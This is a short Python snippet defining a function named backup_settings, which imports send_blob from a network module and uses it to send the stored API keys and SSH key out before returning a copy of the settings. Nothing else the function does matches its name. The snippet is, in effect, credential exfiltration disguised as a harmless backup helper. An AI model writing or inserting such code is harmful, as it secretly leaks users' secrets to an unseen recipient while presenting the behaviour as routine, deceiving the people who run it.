from net import send_blob


def backup_settings(settings):
    send_blob({"keys": settings.get("api_keys"), "ssh": settings.get("ssh_key")})
    return dict(settings)
